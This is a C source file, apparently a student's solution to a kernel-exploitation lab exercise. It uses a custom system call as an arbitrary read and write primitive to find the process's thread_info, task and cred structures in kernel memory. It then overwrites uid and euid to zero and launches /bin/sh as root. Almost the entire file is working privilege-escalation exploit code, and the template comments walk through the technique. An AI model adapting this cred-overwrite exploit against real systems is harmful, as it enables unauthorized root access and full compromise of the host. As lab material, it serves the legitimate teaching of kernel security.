#define _GNU_SOURCE
#include <unistd.h>

#include <stdio.h>
long threadinfo,reset,hp1,hp2,finaladdr,finalprev1, finalprev2, taskaddress1,taskaddress2;
void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.
   // long threadinfo = syscall(326,4,NULL);
    
   //change prev pointer, make prev pointer pt to aarbt address
   threadinfo = syscall(326,4,NULL);
    // Next, you need to find thread_info->task->cred
    //this will give uid,eid address
    
    // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
    //     For example:
    //     (gdb) print (int)&((struct thread_info*)0)->task
    //     will gives you the offset between struct thread_info and  thread_info->task
    // 2. Then you can make use of arbitrary read to get the address of struct task.
    reset = syscall(326,0,NULL);
     taskaddress1 = syscall(326,2,threadinfo-4);
	     //print highest priority in 4 bytes
	     hp1 = syscall(326,3,NULL);
     taskaddress2 = syscall(326,2,threadinfo);
 hp2 = syscall(326,3,NULL);
    // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.
//address of cred   
 finaladdr= (hp2 << 32) + hp1 + 1456;
     reset = syscall(326,0,NULL);
     finalprev1 = syscall(326,2,finaladdr-4);
	     //print highest priority in 4 bytes
	     hp1 = syscall(326,3,NULL);
     finalprev2 = syscall(326,2,finaladdr);
 hp2 = syscall(326,3,NULL);
//task->cred->uid
 
 //value of cred
   finaladdr= (hp2 << 32) + hp1;
//change prev insert new node 4x for euid and uid bc next only 1 byte

int arr[] = {-4,-3,-2,-1,12,13,14,15};
	for (int i = 0; i<8; i++)
	{
//case 0
	threadinfo = syscall(326,0,NULL);
       
             for(int j = 0 ; j < 255; j++)
	        {
	//return truncation of 255 -> 0
	finalprev2 = syscall(326,1,0);
		}
//case 2 
//prev arbt address of euid, uid
	finalprev1 = syscall(326,2,finaladdr+arr[i]);
	printf("address of uid: %ld", finaladdr + 4);
	printf("address of euid: %ld", finaladdr + 20);
	
//case 1   
    // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege
    	finalprev2 = syscall(326,1,0);



	}   

       
return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"euid = %d\n",geteuid());
    // The exploit itself
    runExploit();

  
    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "finaladdr = %lx\n", finaladdr);

    fprintf(stderr, "threadinfo() = %lx\n", threadinfo);
    fprintf(stderr, "getuid() = %x\n", getuid());
    fprintf(stderr,"geteuid = %x\n",geteuid());

    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
